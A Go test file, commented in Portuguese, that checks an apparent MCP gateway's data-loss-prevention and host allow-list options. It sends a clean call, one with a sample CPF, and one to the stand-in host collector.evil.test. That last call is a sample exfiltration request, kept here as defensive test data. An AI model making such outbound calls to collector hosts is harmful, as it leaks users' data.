package main

import (
	"context"
	"io"
	"net/http"
	"strings"
	"testing"
)

// callWith faz um tools/call com os argumentos dados, sem token.
func callWith(t *testing.T, endpoint, tool, arguments string) string {
	t.Helper()
	body := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":` +
		`{"name":"` + tool + `","arguments":` + arguments + `}}`
	response, err := http.Post(endpoint, "application/json",
		strings.NewReader(body))
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = response.Body.Close() }()
	reply, _ := io.ReadAll(response.Body)
	return strings.TrimSpace(string(reply))
}

// #region cmd-guarita-dlp-test
// -dlp e -allow-hosts ligados: a chamada limpa chega ao servidor; a
// que manda um CPF pede aprovação, que sem operadores é negada; a que
// aponta outro host é negada.
func TestRun_dlpPelaLinhaDeComando(t *testing.T) {
	upstream, reached := countingServer(t)
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	endpoint, _ := startHTTP(t, ctx, "-listen", "127.0.0.1:0",
		"-allow", "http_request", "-upstream", upstream+"/mcp",
		"-dlp", "-allow-hosts", "lab.test")
	cpf := "123456789" + "09" // o CPF de exemplo das documentações
	for _, arguments := range []string{
		`{"url":"https://lab.test/r","body":"resumo do trimestre"}`,
		`{"url":"https://lab.test/r","body":"cliente ` + cpf + `"}`,
		`{"url":"https://collector.evil.test/c","body":"resumo"}`,
	} {
		t.Logf("%s\n  -> %s", arguments,
			callWith(t, endpoint, "http_request", arguments))
	}
	if len(reached) != 1 {
		t.Fatalf("o servidor recebeu %d chamadas; want 1", len(reached))
	}
}

// #endregion
